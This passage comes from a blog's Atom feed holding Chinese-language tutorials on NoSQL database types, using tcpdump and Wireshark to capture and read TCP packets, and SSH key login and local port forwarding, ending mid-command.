HBase&#x6BD4;&#x8F83;&#x9002;&#x7528;&#x4E8E;&#x90A3;&#x79CD;KV&#x578B;&#x7684;&#x4E14;&#x672A;&#x6765;&#x65E0;&#x6CD5;&#x9884;&#x4F30;&#x6570;&#x636E;&#x589E;&#x957F;&#x91CF;&#x7684;&#x573A;&#x666F;</td></tr><tr><td>&#x6587;&#x6863;&#x578B;NoSQL</td><td>CouchDB,MongoDB</td><td>MongDB&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x53EF;&#x4EE5;&#x5BF9;&#x6807;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x5904;&#x7406;&#x90A3;&#x4E9B;&#x6CA1;&#x6709;join&#x3001;&#x6CA1;&#x6709;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x4E14;&#x8868;&#x7ED3;&#x6784;&#x4F1A;&#x5E38;&#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x3002;</td></tr><tr><td>&#x641C;&#x7D22;&#x578B;NoSQL</td><td>Elasticsearch</td><td>&#x641C;&#x7D22;&#x578B;NoSql&#x6700;&#x9002;&#x7528;&#x7684;&#x573A;&#x666F;&#x5C31;&#x662F;&#x6709;&#x6761;&#x4EF6;&#x641C;&#x7D22;&#x5C24;&#x5176;&#x662F;&#x5168;&#x6587;&#x641C;&#x7D22;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4F5C;&#x4E3A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x79CD;&#x66FF;&#x4EE3;&#x65B9;&#x6848;&#x3002;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NoSQL&quot;&gt;&lt;a href=&quot;#NoSQL&quot; class=&quot;headerlink&quot; title=&quot;NoSQL&quot;&gt;&lt;/a&gt;NoSQL&lt;/h1&gt;&lt;p&gt;NoSQL&amp;#xFF08;Not Only SQL&amp;#xFF09;&amp;#xFF0C;&amp;#x610F;&amp;#x5373;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>tcpdump与Wireshark的使用</title>
    <link href="https://marnm.github.io//posts/6efb91e0/"/>
    <id>https://marnm.github.io//posts/6efb91e0/</id>
    <published>2022-06-07T04:42:00.000Z</published>
    <updated>2022-06-07T05:18:30.267Z</updated>
    
    <content type="html"><![CDATA[<h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><blockquote><p>&#x4E00;&#x6B3E;sniffer&#x5DE5;&#x5177;&#xFF0C;&#x662F;Linux&#x4E0A;&#x7684;&#x6293;&#x5305;&#x5DE5;&#x5177;&#xFF0C;&#x55C5;&#x63A2;&#x5668;</p></blockquote><p><strong>&#x9009;&#x9879;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-a: &#x5C1D;&#x8BD5;&#x5C06;&#x7F51;&#x7EDC;&#x548C;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x79F0;&#xFF1B;</span><br><span class="line">-c&lt;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&gt;&#xFF1A;&#x6536;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&#x540E;&#xFF0C;&#x5C31;&#x505C;&#x6B62;&#x8FDB;&#x884C;&#x503E;&#x5012;&#x64CD;&#x4F5C;&#xFF1B;</span><br><span class="line">-d&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x53EF;&#x9605;&#x8BFB;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;</span><br><span class="line">-dd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;C&#x8BED;&#x8A00;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;</span><br><span class="line">-ddd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;</span><br><span class="line">-e&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x8FDE;&#x63A5;&#x5C42;&#x7EA7;&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1B;</span><br><span class="line">-f&#xFF1A;&#x7528;&#x6570;&#x5B57;&#x663E;&#x793A;&#x7F51;&#x9645;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#xFF1B;</span><br><span class="line">-F&lt;&#x8868;&#x8FBE;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x5185;&#x542B;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#xFF1B;</span><br><span class="line">-i&lt;&#x7F51;&#x7EDC;&#x754C;&#x9762;&gt;&#xFF1A;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x7F51;&#x7EDC;&#x622A;&#x9762;&#x9001;&#x51FA;&#x6570;&#x636E;&#x5305;&#xFF1B;</span><br><span class="line">-l&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x5217;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF1B;</span><br><span class="line">-n&#xFF1A;&#x4E0D;&#x628A;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x5B57;&#xFF1B;</span><br><span class="line">-N&#xFF1A;&#x4E0D;&#x5217;&#x51FA;&#x57DF;&#x540D;&#xFF1B;</span><br><span class="line">-O&#xFF1A;&#x4E0D;&#x5C06;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x6700;&#x4F73;&#x5316;&#xFF1B;</span><br><span class="line">-p&#xFF1A;&#x4E0D;&#x8BA9;&#x7F51;&#x7EDC;&#x754C;&#x9762;&#x8FDB;&#x5165;&#x6DF7;&#x6742;&#x6A21;&#x5F0F;&#xFF1B;</span><br><span class="line">-q&#xFF1A;&#x5FEB;&#x901F;&#x8F93;&#x51FA;&#xFF0C;&#x4EC5;&#x5217;&#x51FA;&#x5C11;&#x6570;&#x7684;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#x4FE1;&#x606F;&#xFF1B;</span><br><span class="line">-r&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x4ECE;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#xFF1B;</span><br><span class="line">-s&lt;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&gt;&#xFF1A;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;</span><br><span class="line">-S&#xFF1A;&#x7528;&#x7EDD;&#x5BF9;&#x800C;&#x975E;&#x76F8;&#x5BF9;&#x6570;&#x503C;&#x5217;&#x51FA;TCP&#x5173;&#x8054;&#x6570;&#xFF1B;</span><br><span class="line">-t&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;</span><br><span class="line">-tt&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x672A;&#x7ECF;&#x683C;&#x5F0F;&#x5316;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;</span><br><span class="line">-T&lt;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;&gt;&#xFF1A;&#x5F3A;&#x5236;&#x5C06;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x8F6C;&#x8BD1;&#x6210;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;</span><br><span class="line">-v&#xFF1A;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;</span><br><span class="line">-vv&#xFF1A;&#x66F4;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;</span><br><span class="line">-x&#xFF1A;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7801;&#x5217;&#x51FA;&#x6570;&#x636E;&#x5305;&#x8D44;&#x6599;&#xFF1B;</span><br><span class="line">-w&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x628A;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#x5199;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x3002;</span><br></pre></td></tr></tbody></table></figure><p></p><hr><blockquote><p><code>[S]</code>: SYN(&#x5F00;&#x59CB;&#x8FDE;&#x63A5;)<br><code>[.]</code>:&#x6CA1;&#x6709;Flag&#xFF0C;&#xFF08;&#x7531;&#x4E8E;&#x9664;&#x4E86;SYN&#x5305;&#x5916;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x90FD;&#x6709;ACK&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4E5F;&#x53EF;&#x8868;&#x793A;ACK&#xFF09;<br><code>[P]</code>: PSH(&#x63A8;&#x9001;&#x6570;&#x636E;<br><code>[F]</code>: FIN(&#x7ED3;&#x675F;&#x8FDE;&#x63A5;<br><code>[R]</code>: RST(&#x91CD;&#x7F6E;&#x8FDE;&#x63A5;<br><code>[S.]</code>: &#x8868;&#x793A;SYN-ACK&#xFF0C;&#x5C31;&#x662F;SYN&#x62A5;&#x6587;&#x7684;&#x5E94;&#x7B54;&#x62A5;&#x6587;</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">21:27:06.995846&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;64,&#xA0;id&#xA0;45646,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;64)&#xA0;&#xA0;&#xA0;&#xA0;</span><br><span class="line">192.168.1.110.40411&#xA0;&gt;&#xA0;192.168.1.123.80:&#xA0;Flags&#xA0;[S],&#xA0;cksum&#xA0;0xa730&#xA0;(correct),&#xA0;seq&#xA0;992042666,&#xA0;win&#xA0;65535,&#xA0;options&#xA0;[mss&#xA0;1460,nop,wscale&#xA0;4,nop,nop,TS&#xA0;val&#xA0;663433143&#xA0;ecr&#xA0;0,sackOK,eol],&#xA0;length&#xA0;0</span><br><span class="line">21:27:07.030487&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;51,&#xA0;id&#xA0;0,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;44)&#xA0;&#xA0;&#xA0;&#xA0;</span><br><span class="line">192.168.1.123.80&#xA0;&gt;&#xA0;192.168.1.110.40411:&#xA0;Flags&#xA0;[S.],&#xA0;cksum&#xA0;0xedc0&#xA0;(correct),&#xA0;seq&#xA0;2147006684,&#xA0;ack&#xA0;992042667,&#xA0;win&#xA0;14600,&#xA0;options&#xA0;[mss&#xA0;1440],&#xA0;length&#xA0;021:27:07.030527&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;64,&#xA0;id&#xA0;59119,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;40)&#xA0;&#xA0;&#xA0;&#xA0;</span><br><span class="line">192.168.1.110.40411&#xA0;&gt;&#xA0;192.168.1.123.80:&#xA0;Flags&#xA0;[.],&#xA0;cksum&#xA0;0x3e72&#xA0;(correct),&#xA0;ack&#xA0;2147006685,&#xA0;win&#xA0;65535,&#xA0;length&#xA0;0</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x683C;&#x5F0F;&#x89E3;&#x8BFB;</strong></p><ul><li><p>192.168.1.110.40411</p><ul><li>&#x6E90;&#x5730;&#x5740;IP.&#x6E90;&#x7AEF;&#x53E3;</li></ul></li><li><p>192.168.1.123.80</p><ul><li>&#x76EE;&#x7684;&#x5730;&#x5740;.&#x76EE;&#x7684;&#x7AEF;&#x53E3;</li></ul></li><li><p><code>&gt;</code></p><ul><li>&#x4EE3;&#x8868;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5411;</li></ul></li></ul><h4 id="&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;"><a href="#&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;" class="headerlink" title="&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;"></a>&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -ntx -c 1</span><br><span class="line"><span class="comment"># -n &#x663E;&#x793A;IP&#x5730;&#x5740;&#x800C;&#x975E;&#x57DF;&#x540D;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment"># -t &#x4E0D;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;</span></span><br><span class="line"><span class="comment"># -x &#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x663E;&#x793A;&#x5305;&#x5185;&#x5BB9;</span></span><br><span class="line"><span class="comment"># -c tcpdump&#x5C06;&#x5728;&#x63A5;&#x53D7;1&#x4E2A;&#x6570;&#x636E;&#x5305;&#x540E;&#x9000;&#x51FA;</span></span><br></pre></td></tr></tbody></table></figure><p>.png</p><p>192.168.73.10.ssh &gt; 192.168.73.1.13229&#x8868;&#x793A;&#xFF1A;<br>&#x6E90;ip 192.168.73.10&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;ssh;<br>&#x76EE;&#x7684;ip 192.168.73.1&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;13229</p><p><strong>&#x770B;&#x5230;0x000&#x884C;</strong></p><ul><li>&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF1A;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;4&#xFF0C;&#x8868;&#x793A;0x4&#x3002;&#x5373;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x662F;IPv4<br>  &#x5E38;&#x89C1;&#x7684;&#x4E00;&#x4E9B;&#x534F;&#x8BAE;&#x76F8;&#x5E94;&#x5B57;&#x6BB5;&#x503C;</li></ul><table><thead><tr><th>&#x534F;&#x8BAE;&#x540D;</th><th>ICMP</th><th>IGMP</th><th>IP</th><th>TCP</th><th>EGP</th><th>IGP</th><th>UDP</th><th>IPv6</th><th>ESP</th><th>OSPF</th></tr></thead><tbody><tr><td>&#x534F;&#x8BAE;&#x5B57;&#x6BB5;&#x503C;</td><td>1</td><td>2</td><td>4</td><td>6</td><td>8</td><td>9</td><td>17</td><td>41</td><td>50</td><td>89</td></tr></tbody></table><ul><li><p>&#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF1A;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;5&#xFF0C;&#x8868;&#x793A;0x5&#x3002;5*4=20&#xFF08;&#x5341;&#x516D;&#x8FDB;&#x5236;1&#x4F4D;&#x5BF9;&#x5E94;&#x4E8C;&#x8FDB;&#x5236;4&#x4F4D;&#xFF09;&#xFF0C;&#x8868;&#x793A;IP&#x62A5;&#x5934;&#x957F;&#x5EA6;&#x4E3A;20&#x5B57;&#x8282;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x901A;&#x5E38;&#x7B49;&#x4E8E;8&#x4F4D;&#xFF0C;&#x6240;&#x4EE5;IP&#x62A5;&#x5934;&#x4E3A;4510&#x5230;4901<br>.png</p></li><li><p>&#x670D;&#x52A1;&#x7C7B;&#x578B;TOS&#xFF1A;0x00&#xFF0C;&#x610F;&#x5473;&#x7740;&#x662F;&#x4E00;&#x822C;&#x670D;&#x52A1;</p></li><li>&#x603B;&#x957F;&#x5EA6;&#xFF1A;0x00ec&#xFF0C;&#x6362;&#x7B97;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x4E3A;236&#x5B57;&#x8282;&#x3002;</li><li>&#x6807;&#x8BC6;&#xFF1A;0x5175</li><li>3bit&#x6807;&#x5FD7;+13bit&#x7247;&#x504F;&#x79FB;&#xFF1A;0x4000</li><li>&#x751F;&#x5B58;&#x65F6;&#x95F4;&#xFF1A;0x40&#xFF0C;&#x5341;&#x8FDB;&#x5236;&#x503C;&#x4E3A;64</li><li>&#x534F;&#x8BAE;&#xFF1A;0x06 &#x4EE3;&#x8868;TCP&#x534F;&#x8BAE;<br>&#x9996;&#x90E8;&#x6821;&#x9A8C;&#x548C;&#xFF1A;0xd52a</li></ul><h3 id="Wireshark&#x7684;&#x4F7F;&#x7528;"><a href="#Wireshark&#x7684;&#x4F7F;&#x7528;" class="headerlink" title="Wireshark&#x7684;&#x4F7F;&#x7528;"></a>Wireshark&#x7684;&#x4F7F;&#x7528;</h3><p><strong>&#x901A;&#x8FC7;tcpdump&#x6293;&#x5305;&#x5BFC;&#x51FA;pcap&#x6587;&#x4EF6;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i ens33 icmp and host 192.167.73.100 -w ping.pcap</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4F7F;&#x7528;wireshark&#x6253;&#x5F00;&#x8F93;&#x51FA;&#x7684;&#x6587;&#x4EF6;</strong><br>.png</p><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.cnblogs.com/xiaolincoding/p/12922927.html" target="_blank" rel="noopener">&#x5B9E;&#x6218;&#xFF01;&#x6211;&#x7528; Wireshark &#x8BA9;&#x4F60;&#x201C;&#x770B;&#x89C1;&#x201C; TCP</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;tcpdump&quot;&gt;&lt;a href=&quot;#tcpdump&quot; class=&quot;headerlink&quot; title=&quot;tcpdump&quot;&gt;&lt;/a&gt;tcpdump&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x4E00;&amp;#x6B3E;sniffer&amp;#x5DE5;&amp;#x517
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSH原理与应用</title>
    <link href="https://marnm.github.io//posts/e228b71f/"/>
    <id>https://marnm.github.io//posts/e228b71f/</id>
    <published>2022-06-07T04:41:45.000Z</published>
    <updated>2022-06-07T05:18:57.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSH&#x539F;&#x7406;"><a href="#SSH&#x539F;&#x7406;" class="headerlink" title="SSH&#x539F;&#x7406;"></a>SSH&#x539F;&#x7406;</h2><h2 id="SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;"><a href="#SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;" class="headerlink" title="SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;"></a>SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;</h2><h2 id="SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;"><a href="#SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;" class="headerlink" title="SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;"></a>SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;</h2><h2 id="SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;"><a href="#SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;" class="headerlink" title="SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;"></a>SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;</h2><h3 id="&#x53E3;&#x4EE4;&#x767B;&#x5F55;"><a href="#&#x53E3;&#x4EE4;&#x767B;&#x5F55;" class="headerlink" title="&#x53E3;&#x4EE4;&#x767B;&#x5F55;"></a>&#x53E3;&#x4EE4;&#x767B;&#x5F55;</h3><h3 id="&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;"><a href="#&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;" class="headerlink" title="&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;"></a>&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_mail@example.com&quot; -f github_rsa</span><br></pre></td></tr></tbody></table></figure><h4 id="Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;"><a href="#Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;" class="headerlink" title="Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;"></a>Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;</h4><pre><code># Windows&#x5BA2;&#x6237;&#x7AEF;&#xFF1A;ssh-keygen...id_rsa_ubuntu......scp keygen_file.pub linux@addree:~/.ssh/# Linux&#x670D;&#x52A1;&#x5668;:cat .ssh/id_rsa_ubuntu.pub &gt; authorized_keys# Windows&#x5BA2;&#x6237;&#x7AEF;:notepad C:\Users\Administrator\.ssh\configHost 192.168.73.30HostName 192.168.73.30User echoPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa_ubuntu</code></pre><h2 id="SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h2><h3 id="&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h3><p><strong>&#x4EE5;MySQL&#x4E3A;&#x4F8B;</strong></p><blockquote><p>MySQL&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x5141;&#x8BB8;MySQL&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;<br>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5EFA;&#x7ACB;&#x4E0E;MySQL&#x670D;&#x52A1;&#x5668;&#x7684;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;</p></blockquote><p><strong>&#x4E09;&#x79CD;&#x683C;&#x5F0F;&#xFF08;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x90FD;&#x884C;&#xFF09;&#xFF1A;</strong></p><pre><code>ssh -L 127.0.0.1:3306:127.0.0.1:3306 echo@192.168.73.30</code></pre><p>&#x672C;&#x5730;&#x7F51;&#x5361;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF1A;</p><pre><code>ssh -L 3306:127.0.0.1:3306 root@192.168.73.30</code></pre><p>&#x82E5;&#x4E24;&#x53F0;&#x673A;&#x5668;&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#xFF1A;</p><pre><code>ssh -L 3306:127.0.0.1:3306 192.168.73.30</code></pre><p>&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;</p><pre><code>ssh user@ip &apos;command&apos;ssh root@192.168.10.12 &apos;uname -a&apos;tar -cz test | ssh root@192.168.10.12 &apos;tar -xz&apos;</code></pre><p><em>&#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E8E;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528;</em></p><p><strong>&#x3010;&#x6D4B;&#x8BD5;&#x3011;</strong></p><blockquote><p>&#x5728;MySQL&#x670D;&#x52A1;&#x5668;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5982;&#x4E0B;&#xFF1A;</p></blockquote><p>.png</p><blockquote><p>&#x5728;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x5230;MySQL&#x670D;&#x52A1;&#x5668;&#xFF1A;</p></blockquote><p>.png</p><blockquote><p>&#x5173;&#x95ED;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#xFF0C;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x65E0;&#x6CD5;&#x767B;&#x5F55;&#xFF1A;</p></blockquote><p>.png</p><p><strong>&#x6CE8;&#x610F;&#xFF1A;</strong> &#x5982;&#x679C;&#x4F60;&#x4E00;&#x76F4;&#x8BBF;&#x95EE;&#x7740;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x90A3;&#x4E48;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#x65E0;&#x6CD5;&#x5173;&#x95ED;</p><hr><p><strong>Apache/Nginx&#x7684;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#xFF1A;</strong></p><pre><code>ssh -L 192.168.73.10:80:127.0.0.1:80 